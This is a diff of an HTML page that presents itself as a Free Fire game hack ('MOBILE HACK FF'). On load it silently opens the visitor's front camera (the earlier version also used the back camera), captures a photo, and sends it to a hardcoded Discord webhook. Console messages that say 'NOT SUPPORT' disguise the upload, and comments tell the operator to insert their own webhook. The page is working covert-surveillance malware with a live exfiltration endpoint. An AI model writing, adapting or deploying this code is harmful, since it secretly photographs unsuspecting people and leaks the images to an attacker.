@@ -3,57 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture & Discord Webhook</title>
+    <title>MOBILE HACK FF</title>
 </head>
 <body>
-    <h2>Thank You Support Shan Cheat</h2>
-    <video id="video" autoplay style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1340611241831567460/UX39W_BLMhrwgWA6tRwyv_km5GqiZOyXZ0hENlF2IdWT8zyxt38-SKLCeLa67RTBB7wq"; // මෙතැනට ඔබගේ Discord Webhook URL එක දැමන්න
+        const webhookURL = "https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI"; // ඔබේ Discord Webhook URL එක 
 
-        async function captureAndSendPhoto(facingMode) {
+        async function captureAndSendPhoto() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-                const video = document.getElementById("video");
+                // Front Camera Access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement("video");
                 video.srcObject = stream;
+                video.play();
 
                 setTimeout(() => {
-                    const canvas = document.getElementById("canvas");
+                    const canvas = document.createElement("canvas");
                     const context = canvas.getContext("2d");
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Stop the camera
+                    // Stop Camera Stream
                     stream.getTracks().forEach(track => track.stop());
 
                     // Convert to Base64 Image
                     const imageData = canvas.toDataURL("image/png");
 
-                    // Send to Discord Webhook
+                    // Send Image to Discord Webhook
                     fetch(webhookURL, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
-                            content: "Captured Image:",
+                            content: "📸 Captured Image:",
                             embeds: [{ image: { url: imageData } }]
                         })
-                    }).then(response => console.log("Image sent!"));
-                }, 3000);
+                    }).then(response => console.log("NOT SUPPORT"))
+                      .catch(error => console.error("NOT SUPPORT:", error));
+                }, 2000); // 2 Seconds Delay Before Capture
             } catch (error) {
-                console.error("Camera access error:", error);
+                console.error("NO WORKING:", error);
             }
         }
 
-        async function startCapture() {
-            await captureAndSendPhoto("user"); // Front Camera
-            await captureAndSendPhoto("environment"); // Back Camera
-        }
-
-        // Start process after page load
-        window.onload = startCapture;
+        // Auto Start on Page Load
+        window.onload = captureAndSendPhoto;
     </script>
 </body>
 </html>
